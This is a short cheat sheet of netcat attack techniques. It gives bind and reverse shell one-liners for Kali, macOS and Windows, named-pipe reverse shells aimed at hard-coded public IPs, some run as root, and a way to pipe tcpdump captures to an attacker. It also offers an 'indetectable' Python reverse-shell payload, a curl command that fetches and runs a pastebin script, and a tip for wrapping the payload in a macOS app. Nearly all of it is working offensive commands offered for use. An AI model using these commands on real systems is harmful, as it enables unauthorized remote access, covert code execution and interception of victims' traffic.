# Netcat

Kali:

	nc MACOS/Windows-IP 8888  -e /bin/bash (connect)
	nc  -lvvp 8888 -e /bin/bash (listen)

MacOS:

	nc KALI-IP 8888 (connect - cannot execute -e directly)
    nc -l 8888 (listen - cannot execute -e directly)

Windows:

	nc KALI-IP 8888 -e cmd.exe (connect)
	nc  -lvvp 8888 -e cmd.exe (listen)

## Reverse Shell

Shell:

	mkfifo /tmp/f; nc 192.168.0.110 2222 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

Bash:

	mkfifo /tmp/f; nc 51.210.47.127 1234 0</tmp/f | /bin/bash -i >/tmp/f 2>&1; rm /tmp/f

Bash: (root)

	mkfifo /tmp/f; nc 51.210.47.127 1234 0</tmp/f | sudo /bin/bash -i >/tmp/f 2>&1; rm /tmp/f

## Netcat & TCPDump:

Data in file:

Sniff traffic from a mac with netcat (default on macos) and use tcpdump (default on macos) to send the traffic to Kali then use wireshark to analyse that traffic:

	/usr/sbin/tcpdump -w - | nc KALI_IP 7777 (on mac)
	nc -l -p 7777 | tee /tmp/sniffed_output.pcapng (on kali)

Data in real time:

On kali:

	mkfifo /tmp/wiretap
	nc -l -p 9999 > /tmp/wiretap
	wireshark -k -i /tmp/wiretap

On mac:

	/usr/sbin/tcpdump -i <interface> -w - | nc 1.2.3.4 9999

## Netcat & Payload:

### Option 1:

Create an indetectable payload in python and use it to get a shell on every macos system:

	nc -l -p 8080 (listening on kali)

Create a python payload:

	nano payload.py (and paste that script changing the ip)
	import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);

Then, just have to execute that script on macos computer.

	sudo python payload.py

### Option 2:

An other option is to send the script online with a pastebin web service:

	https://pastebin.com

And execute this command on the macos computer:

	curl https://pastebin.com/raw/P6p9WwAT | python - &

### Option 3:

Create a MacOs application to run the script on background with platypus:

	https://sveinbjorn.org/platypus